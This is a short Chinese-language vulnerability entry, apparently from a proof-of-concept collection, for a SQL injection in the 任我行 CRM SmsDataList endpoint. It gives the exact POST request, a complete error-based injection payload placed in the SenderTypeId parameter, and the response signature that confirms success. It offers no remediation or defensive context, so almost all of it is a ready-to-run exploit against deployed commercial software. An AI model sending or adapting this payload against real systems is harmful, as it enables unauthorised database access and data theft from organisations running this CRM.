# 任我行CRMSmsDataListSQL注入漏洞

任我行CRMSmsDataList ｜ SQL注入 ｜ —
- **请求**：`POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1`

**Payload**
```
Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI
```
- **响应特征**：200 0xe10